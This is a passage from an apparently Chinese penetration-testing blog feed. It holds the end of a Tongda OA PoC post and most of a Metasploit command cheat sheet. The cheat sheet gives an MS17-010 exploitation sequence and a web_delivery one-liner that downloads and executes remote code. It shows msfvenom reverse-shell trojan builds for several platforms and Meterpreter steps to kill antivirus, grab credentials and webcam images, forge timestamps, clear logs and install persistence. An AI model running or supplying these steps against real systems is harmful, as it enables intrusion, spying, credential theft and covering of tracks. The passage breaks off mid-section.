src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/643.png"></p><p>在pocsuite3目录下运行脚本：python3 cli.py -r pocs/oa.py -f 通达OA.txt –plugins html_report</p><ul><li>-r 表示指定使用的脚本文件</li><li>-f 表示目标文件</li><li>–plugins html_report 表示将结果保存为html文件</li></ul><p>结果输出保存在HTML文件中，打开文件</p><p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/644.png"></p><p>验证结果如下：</p><p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/645.png"></p><h4 id="参考链接：https-mp-weixin-qq-com-s-IabOKaeNyAsh8V4k2cmXAw"><a href="#参考链接：https-mp-weixin-qq-com-s-IabOKaeNyAsh8V4k2cmXAw" class="headerlink" title="参考链接：https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw"></a><strong>参考链接：</strong><a href="https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw">https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw</a></h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;漏洞类型：未授权访问&quot;&gt;&lt;a href=&quot;#漏洞类型：未授权访问&quot; class=&quot;headerlink&quot; title=&quot;漏洞类型：未授权访问&quot;&gt;&lt;/a&gt;漏洞类型：未授权访问&lt;/h3&gt;&lt;h3 id=&quot;漏洞利用条件：用户在线&quot;&gt;&lt;a href=&quot;#漏洞利用条件：用户在</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="通用漏洞" scheme="http://example.com/tags/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>msf使用大全</title>
    <link href="http://example.com/2021/01/19/Metasploit/"/>
    <id>http://example.com/2021/01/19/Metasploit/</id>
    <published>2021-01-18T16:00:00.000Z</published>
    <updated>2021-03-09T11:04:18.945Z</updated>
    
    <content type="html"><![CDATA[<h3 id="五大模块"><a href="#五大模块" class="headerlink" title="五大模块"></a>五大模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Auxiliaries&#x2F;&#x2F;辅助模块</span><br><span class="line">Exploit&#x2F;&#x2F;漏洞利用模块</span><br><span class="line">Playload&#x2F;&#x2F;攻击载荷模块</span><br><span class="line">Post&#x2F;&#x2F;后期渗透模块</span><br><span class="line">Encoders&#x2F;&#x2F;编码模块</span><br></pre></td></tr></table></figure><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?&#x2F;help         &#x2F;&#x2F;查看帮助信息</span><br><span class="line">? 命令名     &#x2F;&#x2F;查看命令如何使用</span><br><span class="line">search         &#x2F;&#x2F;查找</span><br><span class="line">use   &#x2F;&#x2F;使用某一工具</span><br><span class="line">back           &#x2F;&#x2F;返回</span><br><span class="line">info 模块名     &#x2F;&#x2F;显示模块信息</span><br><span class="line">show options   &#x2F;&#x2F;显示所有选项</span><br><span class="line">set &#x2F;&#x2F;给一个选项赋值到全局变量</span><br><span class="line">unset&#x2F;&#x2F;取消选项的赋值</span><br><span class="line">unsetg&#x2F;&#x2F;取消一个选项赋值到全局变量</span><br><span class="line">version&#x2F;&#x2F;显示MSF和控制台版本</span><br><span class="line">show payloads&#x2F;&#x2F;显示所有payload</span><br><span class="line">jobs&#x2F;&#x2F;查看代理</span><br></pre></td></tr></table></figure><h2 id="模块的使用"><a href="#模块的使用" class="headerlink" title="模块的使用"></a>模块的使用</h2><h3 id="升级模块命令"><a href="#升级模块命令" class="headerlink" title="升级模块命令"></a>升级模块命令</h3><ul><li>如果搜索不到最新的Exploit，可以输入以下命令进行升级，获取最新的模块</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure><h3 id="扫描模块"><a href="#扫描模块" class="headerlink" title="扫描模块"></a>扫描模块</h3><h4 id="常见扫描模块"><a href="#常见扫描模块" class="headerlink" title="常见扫描模块"></a>常见扫描模块</h4><table><thead><tr><th align="center">模块</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">auxiliary/scanner/portscan</td><td align="center">端口扫描</td></tr><tr><td align="center">auxiliary/scanner/smb/smb_version</td><td align="center">SMB系统版本扫描</td></tr><tr><td align="center">auxiliary/scanner/smb/smb_enumusers</td><td align="center">SMB枚举</td></tr><tr><td align="center">auxiliary/scanner/smb/smb_login</td><td align="center">SMB弱口令扫描</td></tr><tr><td align="center">auxiliary/scanner/smb/psexec_command</td><td align="center">SMB登录且执行命令</td></tr><tr><td align="center">auxiliary/scanner/ssh/ssh_login</td><td align="center">SSH登录测试</td></tr><tr><td align="center">scanner/mssql_ping</td><td align="center">MSSQL主机信息扫描</td></tr><tr><td align="center">admin/scanner/mssql_enum</td><td align="center">MSSQL枚举</td></tr><tr><td align="center">admin/scanner/mssql_exec</td><td align="center">MSSQL执行命令</td></tr><tr><td align="center">admin/scanner/mssql_sql</td><td align="center">MSSQL查询</td></tr><tr><td align="center">scanner/scanner/mssql_login</td><td align="center">MSSQL弱口令扫描</td></tr><tr><td align="center">auxiliary/admin/mysql/mysql_enum</td><td align="center">MySQL枚举</td></tr><tr><td align="center">auxiliary/admin/mysql/mysql_sql</td><td align="center">MySQL语句执行</td></tr><tr><td align="center">auxiliary/scanner/mysql/mysql_login</td><td align="center">MySQL弱口令扫描</td></tr><tr><td align="center">auxiliary/scanner/smtp/smtp_version</td><td align="center">SMTP版本扫描</td></tr><tr><td align="center">auxiliary/scanner/smtp/smtp_enum</td><td align="center">SMTP枚举</td></tr><tr><td align="center">auxiliary/scanner/snmp/community</td><td align="center">SNMP扫描设备</td></tr><tr><td align="center">auxiliary/scanner/telnet/telnet_login</td><td align="center">TELNET登录</td></tr><tr><td align="center">scanner/vnc/vnc_none_auth</td><td align="center">VNC空口令扫描</td></tr></tbody></table><h4 id="系统信息模块"><a href="#系统信息模块" class="headerlink" title="系统信息模块"></a>系统信息模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure><h4 id="端口扫描模块"><a href="#端口扫描模块" class="headerlink" title="端口扫描模块"></a>端口扫描模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp </span><br></pre></td></tr></table></figure><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use windows&#x2F;gather&#x2F;arp_scanner</span><br></pre></td></tr></table></figure><ul><li>还可以在反弹回来的shell中使用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;  run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.80.127&#x2F;24</span><br></pre></td></tr></table></figure><h5 id="arp探测存活主机"><a href="#arp探测存活主机" class="headerlink" title="arp探测存活主机"></a>arp探测存活主机</h5><ul><li>如果目标机开启了防火墙，就需要用arp来探测</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run arp_scanner -r 192.168.11.31&#x2F;24</span><br></pre></td></tr></table></figure><h3 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h3><h4 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h4><ul><li> 永恒之蓝  攻击端口号：445  补丁编号：401开头，如果没打补丁，但防火墙限制了445端口访问，也不能成功攻击</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search MS17-010    &#x2F;&#x2F;搜索17-010模块</span><br><span class="line">use 1&#x2F;&#x2F;通常使用0编号模块或者1</span><br><span class="line">set rhost [目标机ip]    </span><br><span class="line">run&#x2F;&#x2F;其他项默认设置，如果开启了代理ip，lhost要设置代理ip</span><br></pre></td></tr></table></figure><ul><li>成功会返回一个shell，如果不成功需要多打几次</li></ul><h4 id="web-delivery"><a href="#web-delivery" class="headerlink" title="web_delivery"></a>web_delivery</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search web_delivery &#x2F;&#x2F;首先搜索模块</span><br><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery  &#x2F;&#x2F;选择模块</span><br><span class="line">set lhost [这里是你自己的ip]&#x2F;&#x2F;设置攻击机ip</span><br><span class="line">show targets&#x2F;&#x2F;选择攻击的脚本，默认为python</span><br><span class="line">run&#x2F;&#x2F;运行后会生成一段payload代码</span><br></pre></td></tr></table></figure><p>payload:  python -c “import sys; u=<strong>import</strong>(‘urllib’+{2:’’,3:’.request’}[sys.version_info[0]],fromlist=(‘urlopen’,));r=u.urlopen(‘<a href="http://192.168.0.102:8080/UrY3oE&#39;);exec(r.read());&quot;">http://192.168.0.102:8080/UrY3oE&#39;);exec(r.read());&quot;</a></p><ul><li><p>上面代码为选择python运行后生成的代码</p></li><li><p>复制payload到目标机上面运行</p></li><li><p>返回kai liunx攻击机，已经反弹回了一个session</p></li><li><p>输入sessions [返回的编号]进入，成功获取了目标机</p></li></ul><h3 id="监听模块"><a href="#监听模块" class="headerlink" title="监听模块"></a>监听模块</h3><h4 id="msfvenom参数"><a href="#msfvenom参数" class="headerlink" title="msfvenom参数"></a>msfvenom参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lhost      &#x2F;&#x2F;监听的ip地址，通常选择本机ip</span><br><span class="line">lport      &#x2F;&#x2F;监听的端口号</span><br><span class="line">-p         &#x2F;&#x2F;选择最后生成的木马类型</span><br><span class="line">-o   &#x2F;&#x2F;指定路径</span><br><span class="line">-f&#x2F;&#x2F;指定后缀名</span><br></pre></td></tr></table></figure><h4 id="msfvenom生成木马方式"><a href="#msfvenom生成木马方式" class="headerlink" title="msfvenom生成木马方式"></a>msfvenom生成木马方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f exe -o &#x2F;root&#x2F;muma.exe</span><br></pre></td></tr></table></figure><ul><li>windows木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f elf -o &#x2F;root&#x2F;muma.elf</span><br></pre></td></tr></table></figure><ul><li>linux木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f raw -o &#x2F;root&#x2F;muma.php </span><br></pre></td></tr></table></figure><ul><li>php木马页面，将页面放在php服务器上既可反弹shell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;meterpreter&#x2F;reverse_tcp LPORT&#x3D;777 LHOST&#x3D;192.168.80.127 -f war -o muma.war</span><br></pre></td></tr></table></figure><ul><li>jsp木马页面，用在tomcat中间件漏洞上</li></ul><h4 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi&#x2F;handler&#x2F;&#x2F;使用监听模块</span><br><span class="line">set lhost [本机ip]&#x2F;&#x2F;生成木马指定的ip</span><br><span class="line">set lport [端口] &#x2F;&#x2F;生成木马指定的端口</span><br><span class="line">set payload [攻击脚本]&#x2F;&#x2F;生成木马指定的脚本</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li>设置好监听run运行，将生成的木马放在目标机上运行，就能反弹回shell到指定的监听ip，通常监听的ip写本机ip</li></ul><h4 id="msf的一个特性"><a href="#msf的一个特性" class="headerlink" title="msf的一个特性"></a>msf的一个特性</h4><ul><li>运行木马反弹shell的时候，目标机会自动多出一个notepad.ext（记事本）的进程</li></ul><h3 id="提权模块"><a href="#提权模块" class="headerlink" title="提权模块"></a>提权模块</h3><h4 id="UAC模块"><a href="#UAC模块" class="headerlink" title="UAC模块"></a>UAC模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search uac</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac </span><br></pre></td></tr></table></figure><h4 id="ms16-032"><a href="#ms16-032" class="headerlink" title="ms16_032"></a>ms16_032</h4><ul><li>搜索模块</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms16032 &#x2F;&#x2F;选择对应模块</span><br><span class="line">use windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">set session 1&#x2F;&#x2F;设置session，其他默认，进行攻击</span><br><span class="line">run&#x2F;&#x2F;成功的话会返回一个新的meterpreter</span><br></pre></td></tr></table></figure><h4 id="14-058"><a href="#14-058" class="headerlink" title="14-058"></a>14-058</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search 14-058</span><br></pre></td></tr></table></figure><h3 id="代理模块"><a href="#代理模块" class="headerlink" title="代理模块"></a>代理模块</h3><p>添加代理的原因：假设本机在ip为192.168.80网段下，目标机A有两个网卡，一个为192.168.80（本机能够访问的网段），另一个网段为192.168.6，目标机B也在192.168.6下，本机访问不到目标机b,添加完代理后，目标机就能通过目标机A的路由添加，使用代理访问到目标机B</p><ul><li>使用代理模块的前提需要使用路由添加</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search socks   &#x2F;&#x2F;有scoks4或socks5等代理方式</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br></pre></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">srvhost &#x2F;&#x2F;设为本机ip</span><br><span class="line">srvport &#x2F;&#x2F;默认1080</span><br></pre></td></tr></table></figure><h4 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h4><ul><li>msf添加完代理后配合kali的proxychains代理工具</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf&#x2F;&#x2F;查看代理配置</span><br><span class="line">socks4 [本机ip]1080  &#x2F;&#x2F;修改配置，保存</span><br></pre></td></tr></table></figure><ul><li>使用方式：只需要在需要使用的工具前使用proxychains</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -p 80,445 192.168.80.127</span><br></pre></td></tr></table></figure><h2 id="Meterpreter命令"><a href="#Meterpreter命令" class="headerlink" title="Meterpreter命令"></a>Meterpreter命令</h2><h4 id="获取正在运行的进程"><a href="#获取正在运行的进程" class="headerlink" title="获取正在运行的进程"></a>获取正在运行的进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure><h4 id="查看Meterpreter-shell的进程号"><a href="#查看Meterpreter-shell的进程号" class="headerlink" title="查看Meterpreter shell的进程号"></a>查看Meterpreter shell的进程号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getpid</span><br></pre></td></tr></table></figure><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate [要迁移的进程号]</span><br></pre></td></tr></table></figure><h4 id="自动迁移进程"><a href="#自动迁移进程" class="headerlink" title="自动迁移进程"></a>自动迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure><h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><h4 id="查看是否为虚拟机"><a href="#查看是否为虚拟机" class="headerlink" title="查看是否为虚拟机"></a>查看是否为虚拟机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br></pre></td></tr></table></figure><h4 id="查看运行时间"><a href="#查看运行时间" class="headerlink" title="查看运行时间"></a>查看运行时间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idletime</span><br></pre></td></tr></table></figure><h4 id="查看完整的网络设置"><a href="#查看完整的网络设置" class="headerlink" title="查看完整的网络设置"></a>查看完整的网络设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure><h4 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure><h4 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure><h4 id="启动远程桌面"><a href="#启动远程桌面" class="headerlink" title="启动远程桌面"></a>启动远程桌面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure><h4 id="查看网络结构"><a href="#查看网络结构" class="headerlink" title="查看网络结构"></a>查看网络结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure><h4 id="列举当前多少用户登录了目标机"><a href="#列举当前多少用户登录了目标机" class="headerlink" title="列举当前多少用户登录了目标机"></a>列举当前多少用户登录了目标机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users </span><br></pre></td></tr></table></figure><h4 id="列举应用程序"><a href="#列举应用程序" class="headerlink" title="列举应用程序"></a>列举应用程序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br></pre></td></tr></table></figure><h4 id="抓取自动登录的用户名和密码"><a href="#抓取自动登录的用户名和密码" class="headerlink" title="抓取自动登录的用户名和密码"></a>抓取自动登录的用户名和密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin</span><br></pre></td></tr></table></figure><h4 id="抓取屏幕截图"><a href="#抓取屏幕截图" class="headerlink" title="抓取屏幕截图"></a>抓取屏幕截图</h4><ul><li>需要先加载扩展插件expia，然后再执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load espia</span><br><span class="line">screengrab</span><br></pre></td></tr></table></figure><h4 id="查看目标有没有摄像头"><a href="#查看目标有没有摄像头" class="headerlink" title="查看目标有没有摄像头"></a>查看目标有没有摄像头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_list</span><br></pre></td></tr></table></figure><h4 id="抓取摄像头的图片"><a href="#抓取摄像头的图片" class="headerlink" title="抓取摄像头的图片"></a>抓取摄像头的图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap</span><br></pre></td></tr></table></figure><h4 id="开启直播模式"><a href="#开启直播模式" class="headerlink" title="开启直播模式"></a>开启直播模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_stream</span><br></pre></td></tr></table></figure><ul><li>用浏览器打开上面的地址</li></ul><h4 id="进入目标机shell"><a href="#进入目标机shell" class="headerlink" title="进入目标机shell"></a>进入目标机shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><h4 id="查看当前处于哪个目录"><a href="#查看当前处于哪个目录" class="headerlink" title="查看当前处于哪个目录"></a>查看当前处于哪个目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwd  &#x2F;&#x2F;下面的命令同样效果</span><br><span class="line">getwd</span><br></pre></td></tr></table></figure><h4 id="查看当前处于本地的哪个目录"><a href="#查看当前处于本地的哪个目录" class="headerlink" title="查看当前处于本地的哪个目录"></a>查看当前处于本地的哪个目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getlwd</span><br></pre></td></tr></table></figure><h4 id="切换目录"><a href="#切换目录" class="headerlink" title="切换目录"></a>切换目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd c:&#x2F;</span><br></pre></td></tr></table></figure><h4 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h4><ul><li>搜索C盘所有以.txt扩展名文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search -f *.txt -d c:&#x2F;  </span><br></pre></td></tr></table></figure><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><ul><li>下载目标机C盘的test.txt文件到攻击机root下</li><li>如果指定的是一个文件夹，会把文件夹内的所有文件下载下来，不包括那个文件夹</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download c:&#x2F;test.txt &#x2F;root </span><br></pre></td></tr></table></figure><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><ul><li><p>上传本地root文件到目标机的C盘下</p></li><li><p>如果指定的是一个文件夹，会把文件夹内的所有文件上传上去，不包括那个文件夹</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload &#x2F;root&#x2F;test.txt c:&#x2F;</span><br></pre></td></tr></table></figure><h4 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h4><ul><li>创建新进程cmd.exe，-H不可见，-i交互</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -H -i -f cmd.exe</span><br></pre></td></tr></table></figure><h4 id="伪造时间戳"><a href="#伪造时间戳" class="headerlink" title="伪造时间戳"></a>伪造时间戳</h4><ul><li>查看帮助</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:&#x2F;&#x2F; -h</span><br></pre></td></tr></table></figure><ul><li>查看时间戳</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timestomp -v C:&#x2F;&#x2F;2.txt</span><br></pre></td></tr></table></figure><ul><li>将1.txt的时间戳复制给2.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:&#x2F;&#x2F;2.txt -f C:&#x2F;&#x2F;1.txt</span><br></pre></td></tr></table></figure><h4 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h4><ul><li>winodws查看事件日志：右键“我的电脑”，选择管理，打开「事件查看器」；或者同时按下 Windows键 + R键，输入“eventvwr.msc”直接打开「事件查看器」。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><ul><li>查看路由信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><ul><li>手动添加路由</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s ip&#x2F;24</span><br></pre></td></tr></table></figure><ul><li>自动添加路由</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><ul><li>将目标机的端口3389转发到本地端口6666</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 192.168.80.135</span><br></pre></td></tr></table></figure><h3 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -A -S -U -i 5 -p 8899 -r 192.168.80.127</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="进入目标机的cmd"><a href="#进入目标机的cmd" class="headerlink" title="进入目标机的cmd"></a>进入目标机的cmd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><h4 id="编号设置为UTF"><a href="#编号设置为UTF" class="headerlink" title="编号设置为UTF"></a>编号设置为UTF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><h4 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami&#x2F;groups</span><br></pre></td></tr></table></figure><ul><li>标准用户：Mandatory 